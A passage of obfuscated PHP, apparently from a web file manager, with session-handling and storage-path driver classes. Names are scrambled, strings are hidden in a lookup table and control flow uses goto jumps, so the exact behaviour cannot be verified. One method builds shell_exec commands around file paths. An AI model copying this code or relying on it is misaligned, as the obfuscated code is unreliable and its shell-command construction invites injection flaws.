case $D‘Û‘÷±…“[17]: self::$handle = Model($D‘Û‘÷±…“[774]); break; case $D‘Û‘÷±…“[775]: self::$handle = new CacheRedis($F˜¼±‰Ã §, $b¯Õ´­ë¶İ); break; case $D‘Û‘÷±…“[776]: self::$handle = new CacheMemcached($F˜¼±‰Ã §, $b¯Õ´­ë¶İ); break; case $D‘Û‘÷±…“[173]: $F˜¼±‰Ã §[$D‘Û‘÷±…“[75]] = $F˜¼±‰Ã §[$D‘Û‘÷±…“[75]] . $D‘Û‘÷±…“[1464]; self::$handle = new CacheFile($F˜¼±‰Ã §, $b¯Õ´­ë¶İ); default: break; } goto e…óï°…»ç; aÊÎãÏºßŒ: if (self::$sessionSign) { } else { if (Cookie::get($d¸©‚‘˜‡ì)) { self::$sessionSign = Cookie::get($d¸©‚‘˜‡ì); } else { self::$sessionSign = guid(); } } Cookie::setSafe($d¸©‚‘˜‡ì, self::$sessionSign, self::$sessionTime); $A¼ŠÁÃØùç = $A›ğ»İŞ·ƒ[$D‘Û‘÷±…“[1463]]; goto fîñŠõ¨ÙÔ; BÒğğ†¾œ§: } public static function sign($Dá’ÉñŸ’ = false) { $Dá’ÉñŸ’ && (self::$sessionSign = $Dá’ÉñŸ’); self::init(); return self::$sessionSign; } public static function set($FÂ†¡ÒÑ§Õ, $Dˆ—ˆÕµ… = false) { self::init(); if (is_array($FÂ†¡ÒÑ§Õ)) { foreach ($FÂ†¡ÒÑ§Õ as $DŞ÷ÔÅ‡…‚ => $b²îÚ’ÕÊ¬) { array_set_value(self::$data, $DŞ÷ÔÅ‡…‚, $b²îÚ’ÕÊ¬); } } else { array_set_value(self::$data, $FÂ†¡ÒÑ§Õ, $Dˆ—ˆÕµ…); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($dáœÅ·å†Ø = false) { self::init(); if (!$dáœÅ·å†Ø) { return self::$data; } return array_get_value(self::$data, $dáœÅ·å†Ø); } public static function remove($Cöà·æ êÌ) { self::init(); unset(self::$data[$Cöà·æ êÌ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Æ¼ôºÙï][778])) { self::$handle->clearTimeout(); } } } goto cŸÇ»ğŒÓ; D—ÒâÚÏ™–: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $a¯Ğ¸îÓ á =& $_SERVER[Æ¼ôºÙï]; $this->objectDriver = array($a¯Ğ¸îÓ á[57], $a¯Ğ¸îÓ á[58], $a¯Ğ¸îÓ á[59], $a¯Ğ¸îÓ á[60], $a¯Ğ¸îÓ á[61], $a¯Ğ¸îÓ á[62], $a¯Ğ¸îÓ á[63], $a¯Ğ¸îÓ á[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($FÌ¾®ƒÃª¹) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($FÌ¾®ƒÃª¹, $_SERVER[Æ¼ôºÙï][8]); } return $FÌ¾®ƒÃª¹; } public function iconvApp($FäòÜ‡‚ï) { return $FäòÜ‡‚ï; } public function iconvSystem($cÎÙ†­Î‘) { return $cÎÙ†­Î‘; } public function iconvTo($e•…¾¿«‡î, $aÔõ‹Œœ¯Ç, $A¾îùØİ‚Ô) { goto FÅ»Œá«…Õ; AĞ“Øí·„à: $f˜õ­Œ¾ïƒ = $f˜õ­Œ¾ïƒ ? $f˜õ­Œ¾ïƒ : $e•…¾¿«‡î; if (strstr($f˜õ­Œ¾ïƒ, $cÈòÕ†„‹Á[69])) { $f˜õ­Œ¾ïƒ = str_replace($cÈòÕ†„‹Á[69], $cÈòÕ†„‹Á[70], $f˜õ­Œ¾ïƒ); } $AÊ¤Ó°ä‰[$aÔõ‹Œœ¯Ç . $cÈòÕ†„‹Á[66] . $A¾îùØİ‚Ô . $cÈòÕ†„‹Á[67] . $e•…¾¿«‡î] = $f˜õ­Œ¾ïƒ; goto FÜ¯À™é‚™; dË×î´¢À: return $f˜õ­Œ¾ïƒ; goto E­ÖØƒ¶¨; CƒšªêŞà¢: $CˆßÁƒ²´õ = $aÔõ‹Œœ¯Ç . $cÈòÕ†„‹Á[66] . $A¾îùØİ‚Ô . $cÈòÕ†„‹Á[67] . $e•…¾¿«‡î; if (isset($AÊ¤Ó°ä‰[$CˆßÁƒ²´õ])) { return $AÊ¤Ó°ä‰[$CˆßÁƒ²´õ]; } if (function_exists($cÈòÕ†„‹Á[68])) { $f˜õ­Œ¾ïƒ = @mb_convert_encoding($e•…¾¿«‡î, $A¾îùØİ‚Ô, $aÔõ‹Œœ¯Ç); } else { $f˜õ­Œ¾ïƒ = @iconv($aÔõ‹Œœ¯Ç, $A¾îùØİ‚Ô, $e•…¾¿«‡î); } goto AĞ“Øí·„à; FÅ»Œá«…Õ: $cÈòÕ†„‹Á =& $_SERVER[Æ¼ôºÙï]; if (!$e•…¾¿«‡î || !function_exists($cÈòÕ†„‹Á[65])) { return $e•…¾¿«‡î; } static $AÊ¤Ó°ä‰ = array(); goto CƒšªêŞà¢; FÜ¯À™é‚™: $AÊ¤Ó°ä‰[$A¾îùØİ‚Ô . $cÈòÕ†„‹Á[66] . $aÔõ‹Œœ¯Ç . $cÈòÕ†„‹Á[67] . $e•…¾¿«‡î] = $e•…¾¿«‡î; $AÊ¤Ó°ä‰[$A¾îùØİ‚Ô . $cÈòÕ†„‹Á[66] . $aÔõ‹Œœ¯Ç . $cÈòÕ†„‹Á[67] . $f˜õ­Œ¾ïƒ] = $e•…¾¿«‡î; $AÊ¤Ó°ä‰[$aÔõ‹Œœ¯Ç . $cÈòÕ†„‹Á[66] . $A¾îùØİ‚Ô . $cÈòÕ†„‹Á[67] . $f˜õ­Œ¾ïƒ] = $f˜õ­Œ¾ïƒ; goto dË×î´¢À; E­ÖØƒ¶¨: } public function getPathInner($e÷Ê¶Ìíã) { $B®³¨¢ã² = IO::init($e÷Ê¶Ìíã); return $B®³¨¢ã²->path; } public function getPathOuter($BƒË“­) { $eµ“ˆÅÏâ› =& $_SERVER[Æ¼ôºÙï]; $cÄ½¬õ£Ù = strlen(trim($this->pathBase, $eµ“ˆÅÏâ›[8])); $BƒË“­ = substr(trim($BƒË“­, $eµ“ˆÅÏâ›[8]), $cÄ½¬õ£Ù); return $this->pathDriver . $eµ“ˆÅÏâ›[8] . ltrim($BƒË“­, $eµ“ˆÅÏâ›[8]); } public function isParentOf($C›äÉŒ§Ñ¿, $E„ºö×‰ˆ·) { $b„œÈíî‘¸ =& $_SERVER[Æ¼ôºÙï]; $C›äÉŒ§Ñ¿ = rtrim(strtolower($C›äÉŒ§Ñ¿), $b„œÈíî‘¸[8]) . $b„œÈíî‘¸[8]; $E„ºö×‰ˆ· = rtrim(strtolower($E„ºö×‰ˆ·), $b„œÈíî‘¸[8]) . $b„œÈíî‘¸[8]; $d©‡ÙŞ­¶å = strpos($E„ºö×‰ˆ·, $C›äÉŒ§Ñ¿) === 0; return $d©‡ÙŞ­¶å; } public function getType() { $bˆ êîô‹Ô =& $_SERVER[Æ¼ôºÙï]; $f¥©ôœä‚Ú = str_replace($bˆ êîô‹Ô[71], $bˆ êîô‹Ô[33], get_class($this)); return strtolower($f¥©ôœä‚Ú); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($FÆ±¤ë¯§Î, $D¿ÁÓâñÇ») { $e¶¦‘ã»ñ¬ =& $_SERVER[Æ¼ôºÙï]; $FÖ’²²ç = rtrim($FÆ±¤ë¯§Î, $e¶¦‘ã»ñ¬[8]) . $e¶¦‘ã»ñ¬[8] . $D¿ÁÓâñÇ»; $e¡¸„¦òÅÂ = $this->exist($FÖ’²²ç); return $e¡¸„¦òÅÂ ? $FÖ’²²ç : !1; } public function setModifyTime($eíâÏ”²ö, $d‘õé´Öï = '') { } public function renameObject($DãŠŞÆÓÒ, $F×‡—Ñ¼ƒ×) { goto C‰ë‘Âí“; C‰ë‘Âí“: $eøâ°ƒ³¡ä =& $_SERVER[Æ¼ôºÙï]; $Báñö‡ø²… = $F×‡—Ñ¼ƒ×; Hook::trigger($eøâ°ƒ³¡ä[72], $this, $DãŠŞÆÓÒ, $this, $this->pathFather($DãŠŞÆÓÒ) . $F×‡—Ñ¼ƒ×); goto e“ßéÒÙê; b•†”Àù£: return $c²ÀÀÑ¥—Œ ? $F×‡—Ñ¼ƒ× : !1; goto EÛÊôõñ÷; e“ßéÒÙê: $DãŠŞÆÓÒ = $this->getPathOuter($DãŠŞÆÓÒ); $F×‡—Ñ¼ƒ× = $this->pathFather($DãŠŞÆÓÒ) . $F×‡—Ñ¼ƒ×; if (IO::isFile($DãŠŞÆÓÒ)) { $c²ÀÀÑ¥—Œ = IO::copy($DãŠŞÆÓÒ, $this->pathFather($DãŠŞÆÓÒ), REPEAT_RENAME_FOLDER, $Báñö‡ø²…); if ($c²ÀÀÑ¥—Œ) { IO::remove($DãŠŞÆÓÒ); } } else { $c²ÀÀÑ¥—Œ = IO::mkdir($F×‡—Ñ¼ƒ×); if (!$c²ÀÀÑ¥—Œ) { return !1; } $d’™“ ÂÌÓ = IO::listPath($DãŠŞÆÓÒ, !0); $båÓª‡ùÅ¬ = array_merge($d’™“ ÂÌÓ[$eøâ°ƒ³¡ä[73]], $d’™“ ÂÌÓ[$eøâ°ƒ³¡ä[74]]); foreach ($båÓª‡ùÅ¬ as $AÚ†ëâè) { IO::move($AÚ†ëâè[$eøâ°ƒ³¡ä[75]], $F×‡—Ñ¼ƒ×, REPEAT_RENAME_FOLDER); } IO::remove($DãŠŞÆÓÒ); } goto b•†”Àù£; EÛÊôõñ÷: } public function tempFile($cäñŒÊ¢ì = '', $cÒÏ…æã¼Ú = '') { goto dæ³ê¦îëƒ; d¶„¹Ü±æã: $c…†­Ø‡§Ü = $C¡ÆŸ˜Õº‚ . $cäñŒÊ¢ì; @touch($c…†­Ø‡§Ü); if ($cÒÏ…æã¼Ú) { file_put_contents($c…†­Ø‡§Ü, $cÒÏ…æã¼Ú); } goto BïÒ½†ê™; BïÒ½†ê™: return $c…†­Ø‡§Ü; goto eîùŸ“­­Ó; dæ³ê¦îëƒ: if (!$cäñŒÊ¢ì) { $cäñŒÊ¢ì = rand_string(15); } $C¡ÆŸ˜Õº‚ = TEMP_FILES . rand_string(15) . $_SERVER[Æ¼ôºÙï][8]; @mkdir($C¡ÆŸ˜Õº‚, 511, !0); goto d¶„¹Ü±æã; eîùŸ“­­Ó: } public function tempFileRemve($Eƒ¨Ú¶à£) { @unlink($Eƒ¨Ú¶à£); @rmdir($this->pathFather($Eƒ¨Ú¶à£)); } public function mkfile($B£•¶ƒêÎÙ, $bÈÛÇ÷¸¨º = '', $EŠáÊ©°ãé = REPEAT_RENAME) { } public function mkdir($d¼ÊÕ¾Ò‡‰, $e”ĞŠ”áÈÀ = REPEAT_SKIP) { } public function delFile($AÑŞ”ÆË¼) { } public function delFolder($Dß¹ª”†¬¥) { } public function copyFile($a¢ìì÷¡Ø², $EáôêĞÈ¤Ö) { } public function moveFile($aÕÒ¼ì°í…, $f‘‡ÓŠÒ®§) { } public function remove($FŞ¤™‰ê²Ù) { if ($this->isFile($FŞ¤™‰ê²Ù)) { return $this->delFile($FŞ¤™‰ê²Ù); } return $this->delFolder($FŞ¤™‰ê²Ù); } public function rename($DÄÔ‡ ºá, $b£Ÿâ°†«) { } public function exist($e¡öô‚…ŠÕ) { } public function findByHash($bœÇíÜã¡ = '', $F‘…Æ­ ãÆ = '') { return !1; } public function isFile($eó›¤Öã) { } public function isFolder($Bš÷¡â×¹) { } public function size($añ¢ŸÌšÜÀ) { } public function info($eÃ‹·Í×Ø¡) { } public function infoSimple($Bôïß¨‡†Ğ) { return $this->info($Bôïß¨‡†Ğ); } public function infoAuth($cŒ¿´Å¤Ë) { return $this->info($cŒ¿´Å¤Ë); } public function infoFull($aÊ°å²ˆŸ¾) { return $this->info($aÊ°å²ˆŸ¾); } public function infoWithChildren($a¤½ÖöÇ‡š) { $EÎ­Çá–ôš =& $_SERVER[Æ¼ôºÙï]; static $f•ó‚Î‡‡¾ = array(); if (isset($f•ó‚Î‡‡¾[$a¤½ÖöÇ‡š])) { return $f•ó‚Î‡‡¾[$a¤½ÖöÇ‡š]; } $cÊÆ¸å×œ‚ = $this->info($a¤½ÖöÇ‡š); if ($cÊÆ¸å×œ‚ && $cÊÆ¸å×œ‚[$EÎ­Çá–ôš[29]] == $EÎ­Çá–ôš[76]) { $e¤…¶È®ï¹ = array($EÎ­Çá–ôš[77] => 0, $EÎ­Çá–ôš[78] => 0, $EÎ­Çá–ôš[79] => 0); $this->infoChildren($a¤½ÖöÇ‡š, $e¤…¶È®ï¹); $cÊÆ¸å×œ‚[$EÎ­Çá–ôš[77]] = $e¤…¶È®ï¹[$EÎ­Çá–ôš[77]]; $cÊÆ¸å×œ‚[$EÎ­Çá–ôš[80]] = array($EÎ­Çá–ôš[81] => $e¤…¶È®ï¹[$EÎ­Çá–ôš[78]], $EÎ­Çá–ôš[82] => $e¤…¶È®ï¹[$EÎ­Çá–ôš[79]]); $f•ó‚Î‡‡¾[$a¤½ÖöÇ‡š] = $cÊÆ¸å×œ‚; } return $cÊÆ¸å×œ‚; } public function listPath($aœ¾Óö¨›, $DÅ£äÜ´¿ = false) { } public function has($A§³”˜’­Õ, $bó¨•ÌŞ‡Á = false, $b¿òñÙÊˆË = false) { } public function canRead($D­ïÊ£âß) { } public function canWrite($fÈ…ï¿éœ) { } public function getContent($EÒ¤Ì•) { } public function setContent($AâôËÛ²ê›, $eö¢¾¶ªË = '') { } protected function infoChildren($AÔ”Üò¤Ùù, &$fâ’†ôÁ†á) { $cÍ„»¬ˆªØ =& $_SERVER[Æ¼ôºÙï]; check_abort_echo(); $døä¯Ò‰ƒ“ = $this->listPath($AÔ”Üò¤Ùù, !0); $døä¯Ò‰ƒ“ = array_merge($døä¯Ò‰ƒ“[$cÍ„»¬ˆªØ[74]], $døä¯Ò‰ƒ“[$cÍ„»¬ˆªØ[73]]); foreach ($døä¯Ò‰ƒ“ as $Cˆƒ†“í®•) { if ($Cˆƒ†“í®•[$cÍ„»¬ˆªØ[29]] == $cÍ„»¬ˆªØ[76]) { $fâ’†ôÁ†á[$cÍ„»¬ˆªØ[79]]++; $dáÕÚñ²ó = $this->getPathInner($Cˆƒ†“í®•[$cÍ„»¬ˆªØ[75]]); $this->infoChildren($dáÕÚñ²ó, $fâ’†ôÁ†á); } else { $fâ’†ôÁ†á[$cÍ„»¬ˆªØ[78]]++; $fâ’†ôÁ†á[$cÍ„»¬ˆªØ[77]] += $Cˆƒ†“í®•[$cÍ„»¬ˆªØ[77]]; } } } public function fileSubstr($aÙ·ëŠóÓÇ, $d²“ë¦ãÇ, $d‹¬·Ş«Î•) { } public function listAll($Fš Œ­——Ü) { } public function listAllMake($BæÑˆˆ½´Ğ, &$bˆ´ó¹—‹‰) { $C¡¿ø£õó´ =& $_SERVER[Æ¼ôºÙï]; check_abort_echo(); $e¼™†¦•¦› = $this->listPath($BæÑˆˆ½´Ğ, !0); if (!$e¼™†¦•¦›) { return; } $BŒ¯ëñğ± = array_merge($e¼™†¦•¦›[$C¡¿ø£õó´[74]], $e¼™†¦•¦›[$C¡¿ø£õó´[73]]); foreach ($BŒ¯ëñğ± as $c‘ê ˆéò) { goto C„Ãî½“‘; C„Ãî½“‘: $fÉ·‘ÍÃ”– = $c‘ê ˆéò[$C¡¿ø£õó´[29]] == $C¡¿ø£õó´[76]; $c‘ŒëÒ®× = array($C¡¿ø£õó´[75] => $c‘ê ˆéò[$C¡¿ø£õó´[75]], $C¡¿ø£õó´[76] => $fÉ·‘ÍÃ”–); if (isset($c‘ê ˆéò[$C¡¿ø£õó´[77]])) { $c‘ŒëÒ®×[$C¡¿ø£õó´[77]] = $c‘ê ˆéò[$C¡¿ø£õó´[77]]; } goto F¤Œ‹ğìëÓ; eƒ´ç¹†âä: $this->listAllMake($c‘ê ˆéò[$C¡¿ø£õó´[75]], $bˆ´ó¹—‹‰); goto fß¬œŠÙì; F¤Œ‹ğìëÓ: if (isset($c‘ê ˆéò[$C¡¿ø£õó´[83]])) { $c‘ŒëÒ®×[$C¡¿ø£õó´[83]] = $c‘ê ˆéò[$C¡¿ø£õó´[83]]; } if (!$fÉ·‘ÍÃ”–) { $bˆ´ó¹—‹‰[] = $c‘ŒëÒ®×; continue; } $bˆ´ó¹—‹‰[] = $c‘ŒëÒ®×; goto eƒ´ç¹†âä; fß¬œŠÙì: } } public function listAllSimple($c¸”Õœ®ò™) { $dŞ›á‹…ó™ =& $_SERVER[Æ¼ôºÙï]; $bªÍõ“í = array(); $c¿˜ââƒ¨ = $this->listAll($c¸”Õœ®ò™); $A©Ùº‚ƒÎå = $this->getPathOuter($c¸”Õœ®ò™); foreach ($c¿˜ââƒ¨ as $AÜñë¯†á) { goto b†ÂÔ¸Åæ¦; aš´…íîŒÓ: if (!$AÜñë¯†á[$dŞ›á‹…ó™[76]]) { $EŠ¾çŸõ”[$dŞ›á‹…ó™[85]] = $Aƒ¢³„öŸŞ; } $bªÍõ“í[] = $EŠ¾çŸõ”; goto c“Û¥Œµ; EÏ±èÁÜ¹’: $EŠ¾çŸõ” = array($dŞ›á‹…ó™[75] => $E”İåéÉ®¢, $dŞ›á‹…ó™[76] => $AÜñë¯†á[$dŞ›á‹…ó™[76]]); if (isset($AÜñë¯†á[$dŞ›á‹…ó™[77]]) && !$AÜñë¯†á[$dŞ›á‹…ó™[76]]) { $EŠ¾çŸõ”[$dŞ›á‹…ó™[77]] = $AÜñë¯†á[$dŞ›á‹…ó™[77]]; } if (isset($AÜñë¯†á[$dŞ›á‹…ó™[83]])) { $EŠ¾çŸõ”[$dŞ›á‹…ó™[83]] = $AÜñë¯†á[$dŞ›á‹…ó™[83]]; } goto aš´…íîŒÓ; b†ÂÔ¸Åæ¦: $Aƒ¢³„öŸŞ = $AÜñë¯†á[$dŞ›á‹…ó™[75]]; $E”İåéÉ®¢ = $AÜñë¯†á[$dŞ›á‹…ó™[75]]; if (isset($AÜñë¯†á[$dŞ›á‹…ó™[84]])) { $Aƒ¢³„öŸŞ = $AÜñë¯†á[$dŞ›á‹…ó™[84]][$dŞ›á‹…ó™[75]]; $AÜñë¯†á[$dŞ›á‹…ó™[77]] = $AÜñë¯†á[$dŞ›á‹…ó™[84]][$dŞ›á‹…ó™[77]]; $AÜñë¯†á[$dŞ›á‹…ó™[83]] = $AÜñë¯†á[$dŞ›á‹…ó™[84]][$dŞ›á‹…ó™[83]]; } else { $E”İåéÉ®¢ = substr($AÜñë¯†á[$dŞ›á‹…ó™[75]], strlen(get_path_father($A©Ùº‚ƒÎå))); $E”İåéÉ®¢ = $dŞ›á‹…ó™[8] . ltrim($E”İåéÉ®¢, $dŞ›á‹…ó™[8]); } goto EÏ±èÁÜ¹’; c“Û¥Œµ: } return $bªÍõ“í; } public function upload($eº¿’¨¨ê†, $Bğ¶ø¨¥èÉ, $e†Ò½òê¨‡ = false, $EÊò»†Ñùğ = REPEAT_REPLACE) { } public function uploadFileByID($CßĞ£‡ùå¾, $B¦×öĞˆ·‚, $aÛÔ¯‰ŸÅ) { } public function uploadFileByPath($Fğù³‘Ìº, $C„ÔäÎ››, $fƒÃÛ‡ÏÈ£ = array()) { } public function isUploadServer() { $aìâ×—¹ÖÄ =& $_SERVER[Æ¼ôºÙï]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $aìâ×—¹ÖÄ[86]) { return !0; } return $GLOBALS[$aìâ×—¹ÖÄ[6]][$aìâ×—¹ÖÄ[87]][$aìâ×—¹ÖÄ[88]]; } public function isFileOutServer() { $CÛ“÷Íóİ¹ =& $_SERVER[Æ¼ôºÙï]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $CÛ“÷Íóİ¹[86]) { return !0; } return $GLOBALS[$CÛ“÷Íóİ¹[6]][$CÛ“÷Íóİ¹[87]][$CÛ“÷Íóİ¹[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($fÖ°Ô¤‡ï) { $B¡›°±ÎÃñ =& $_SERVER[Æ¼ôºÙï]; if (!$this->isCdnHost()) { return $fÖ°Ô¤‡ï; } return str_replace(trim(get_url_root($fÖ°Ô¤‡ï), $B¡›°±ÎÃñ[8]), trim($this->cdnHost, $B¡›°±ÎÃñ[8]), $fÖ°Ô¤‡ï); } public function uploadLink($BÏ±†Š¥ÖÓ, $dÄƒÍÃíé = 0) { goto F–èÙ¿‚ˆ; dªÏª›ˆ¯Î: $BäÎâÊ‘¡İ = $dÄƒÍÃíé <= $ašâÂÓçÍÀ ? $Bï…òÍâŒ[90] : $Bï…òÍâŒ[91]; $cÒ¬ˆåŠñê = (!$dÄƒÍÃíé ? 1 : ceil($dÄƒÍÃíé / pow(1024, 3))) * 3600 * 4; $añ¿œ†¢Í  = $this->{$BäÎâÊ‘¡İ}($BÏ±†Š¥ÖÓ, $cÒ¬ˆåŠñê); goto CùÒÄàÆæ”; CùÒÄàÆæ”: if ($añ¿œ†¢Í ) { $añ¿œ†¢Í [$Bï…òÍâŒ[92]] = $BÏ±†Š¥ÖÓ; $añ¿œ†¢Í [$Bï…òÍâŒ[93]] = $Cñ–âÁšê¾; } return $añ¿œ†¢Í ; goto FÉ¥†ÂÄ«; AÇØ‚¿§³ã: if (!in_array($Cñ–âÁšê¾, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ašâÂÓçÍÀ = 1024 * 1024 * 10; goto dªÏª›ˆ¯Î; F–èÙ¿‚ˆ: $Bï…òÍâŒ =& $_SERVER[Æ¼ôºÙï]; if ($this->isUploadServer()) { return; } $Cñ–âÁšê¾ = $this->getType(); goto AÇØ‚¿§³ã; FÉ¥†ÂÄ«: } public function uploadFormData($AÛšÌ›Ñó˜, $aĞå¿ã¡æÉ = 3600) { } public function multiUploadFormData($eåöé˜™Æ‰, $FÆÕ°ßæ°¹ = 3600) { } public function download($c¸ÍšáÂÄ, $f´ÇÀ½ˆÈ) { } public function ext($FÊë¯øĞğ) { $AŒÅÂ›‡­¼ =& $_SERVER[Æ¼ôºÙï]; if (strpos($FÊë¯øĞğ, $AŒÅÂ›‡­¼[8]) === -1) { $F†áîµõ‚ = $FÊë¯øĞğ; } else { $F†áîµõ‚ = $this->pathThis($FÊë¯øĞğ); } $c º¡ØÀæ– = $AŒÅÂ›‡­¼[33]; if (strstr($F†áîµõ‚, $AŒÅÂ›‡­¼[94])) { $c º¡ØÀæ– = substr($F†áîµõ‚, strrpos($F†áîµõ‚, $AŒÅÂ›‡­¼[94]) + 1); $c º¡ØÀæ– = strtolower($c º¡ØÀæ–); } if (strlen($c º¡ØÀæ–) > 3 && preg_match($AŒÅÂ›‡­¼[95], $c º¡ØÀæ–, $Aøµ‰È… ´)) { $c º¡ØÀæ– = $AŒÅÂ›‡­¼[33]; } return $c º¡ØÀæ–; } public function pathThis($AŒ‰ÆÀÂã÷) { $eÛ†•éˆ³Ã =& $_SERVER[Æ¼ôºÙï]; $AŒ‰ÆÀÂã÷ = str_replace($eÛ†•éˆ³Ã[96], $eÛ†•éˆ³Ã[8], rtrim($AŒ‰ÆÀÂã÷, $eÛ†•éˆ³Ã[8])); $b²ò¯Ú×ÜÇ = strrpos($AŒ‰ÆÀÂã÷, $eÛ†•éˆ³Ã[8]); if ($b²ò¯Ú×ÜÇ === !1) { return $AŒ‰ÆÀÂã÷; } return substr($AŒ‰ÆÀÂã÷, $b²ò¯Ú×ÜÇ + 1); } public function pathFather($aÅãßšíóÉ) { $AÃ„Ö‰ ®î =& $_SERVER[Æ¼ôºÙï]; $aÅãßšíóÉ = str_replace($AÃ„Ö‰ ®î[96], $AÃ„Ö‰ ®î[8], rtrim($aÅãßšíóÉ, $AÃ„Ö‰ ®î[8])); $e‹£«¿áøğ = strrpos($aÅãßšíóÉ, $AÃ„Ö‰ ®î[8]); if ($e‹£«¿áøğ === !1) { return $AÃ„Ö‰ ®î[33]; } return substr($aÅãßšíóÉ, 0, $e‹£«¿áøğ + 1); } public function hashSimple($cè¦—§•æÁ) { goto B„¤®Òõ; eöšÑçÌÕŸ: $BÏƒĞŸ­°Å .= $this->fileSubstr($cè¦—§•æÁ, $fåÏêĞÍ± - $fÓˆÈôÕ›, $fÓˆÈôÕ›); return md5($BÏƒĞŸ­°Å) . $fåÏêĞÍ±; goto eÇ‚æƒÃ“À; B„¤®Òõ: $bëÓì£Õï =& $_SERVER[Æ¼ôºÙï]; if (!$cè¦—§•æÁ) { return md5($bëÓì£Õï[33]); } $fåÏêĞÍ± = $this->size($cè¦—§•æÁ); goto bâ©Ñ™ñÇƒ; bâ©Ñ™ñÇƒ: $fÓˆÈôÕ› = 200; $D„×ø‡”˜¢ = 50; if ($fåÏêĞÍ± <= $fÓˆÈôÕ› * $D„×ø‡”˜¢) { return $this->hashMd5($cè¦—§•æÁ) . $fåÏêĞÍ±; } goto A‰³Ûë†À‘; A‰³Ûë†À‘: $Fñ¢“õ¹¦” = intval($fåÏêĞÍ± / $D„×ø‡”˜¢); $BÏƒĞŸ­°Å = $bëÓì£Õï[33]; for ($cèß¼—èƒ = 0; $cèß¼—èƒ < $D„×ø‡”˜¢; $cèß¼—èƒ++) { $BÏƒĞŸ­°Å .= $this->fileSubstr($cè¦—§•æÁ, $Fñ¢“õ¹¦” * $cèß¼—èƒ, $fÓˆÈôÕ›); } goto eöšÑçÌÕŸ; eÇ‚æƒÃ“À: } public static $md5Cache = array(); public function hashMd5($E¶ÆÈ§„Ò¿) { $E¶ÆÈ§„Ò¿ = $this->iconvSystem($E¶ÆÈ§„Ò¿); if (isset(self::$md5Cache[$E¶ÆÈ§„Ò¿])) { return self::$md5Cache[$E¶ÆÈ§„Ò¿]; } self::$md5Cache[$E¶ÆÈ§„Ò¿] = $this->hashMd5Shell($E¶ÆÈ§„Ò¿); if (!self::$md5Cache[$E¶ÆÈ§„Ò¿]) { self::$md5Cache[$E¶ÆÈ§„Ò¿] = @md5_file($E¶ÆÈ§„Ò¿); } return self::$md5Cache[$E¶ÆÈ§„Ò¿]; } private function hashMd5Shell($A ’æŞ™µá) { goto bèê©¯‰äß; AÔ«œ–‘¼¯: $DÙî»Ã³â = Cache::get($e¤¸åÕš­ğ[100]); if (!$DÙî»Ã³â) { $aÑ¸Ê¬™é = BASIC_PATH . $e¤¸åÕš­ğ[101]; $d©ª‘İµÙ = md5_file($aÑ¸Ê¬™é); $DÙî»Ã³â = $e¤¸åÕš­ğ[102]; foreach ($AÕˆ‡±÷ò as $cãÖÖİä») { $CšÙ‚ø« = shell_exec($cãÖÖİä» . "\40\x22{$aÑ¸Ê¬™é}\42"); if ($CšÙ‚ø« && substr(trim($CšÙ‚ø«), 0, 32) == $d©ª‘İµÙ) { $DÙî»Ã³â = $cãÖÖİä»; break; } } Cache::set($e¤¸åÕš­ğ[100], $DÙî»Ã³â, 3600); } if ($DÙî»Ã³â == $e¤¸åÕš­ğ[102]) { return !1; } goto A¶½åğ¤è‰; bèê©¯‰äß: $e¤¸åÕš­ğ =& $_SERVER[Æ¼ôºÙï]; if (!function_exists($e¤¸åÕš­ğ[97])) { return !1; } $AÕˆ‡±÷ò = array($e¤¸åÕš­ğ[98], $e¤¸åÕš­ğ[99]); goto AÔ«œ–‘¼¯; A¶½åğ¤è‰: $CšÙ‚ø« = shell_exec($DÙî»Ã³â . "\40\x22{$A ’æŞ™µá}\x22"); $CšÙ‚ø« = str_replace($e¤¸åÕš­ğ[103], $e¤¸åÕš­ğ[33], $CšÙ‚ø«); return substr($CšÙ‚ø«, 0, 32); goto Cµ³†‚”£×; Cµ³†‚”£×: } public function link($a±ƒõ×¤Ü‚) { return $a±ƒõ×¤Ü‚; } public function fileOut($E³™ëÎ¸ã, $bŞ’ÀÈ ”Å = false, $DÉ»‚Ïœ = false, $fµ´İ•¹•Å = '') { goto F¾ÎÀğ¶È‹; DÂï¹æĞ÷: header($Fåé¶Ö½[137] . $DèóŒ†ßÙ); header($Fåé¶Ö½[138]); if (!$bŞ’ÀÈ ”Å && $f¢îĞÆ¾ì¡ == $Fåé¶Ö½[139]) { if ($DèóŒ†ßÙ > 1024 * 1024 * 5) { die; } $EÚ’Ö¡—Ìì = $this->getContent($E³™ëÎ¸ã); $EÚ’Ö¡—Ìì = Html::clearSVG($EÚ’Ö¡—Ìì); header($Fåé¶Ö½[140] . strlen($EÚ’Ö¡—Ìì)); echo $EÚ’Ö¡—Ìì; die; } goto AÁ‘â‘ë«; D‘Øõ°µòÕ: header($Fåé¶Ö½[119]); header($Fåé¶Ö½[120] . $E—»¢Ò¸‰µ); $A‘¬êÆµƒ¤ = rawurlencode($féñ­¿ÇÕ°); goto f®ºê£«Ø; DÆŠ÷×Şî³: if (isset($_SERVER[$Fåé¶Ö½[130]]) && strtotime($_SERVER[$Fåé¶Ö½[130]]) == $c©£ÓœªÉƒ[$Fåé¶Ö½[83]]) { header($Fåé¶Ö½[131], !0, 304); die; } if (isset($_SERVER[$Fåé¶Ö½[132]]) && $_SERVER[$Fåé¶Ö½[132]] == $fµ´İ•¹•Å) { header($Fåé¶Ö½[133] . $fµ´İ•¹•Å, !0, 304); die; } header($Fåé¶Ö½[133] . $fµ´İ•¹•Å); goto a•µÂ„³”ñ; EßÜâ‚æ÷: header($Fåé¶Ö½[127]); header($Fåé¶Ö½[128]); header($Fåé¶Ö½[129]); goto DÆŠ÷×Şî³; 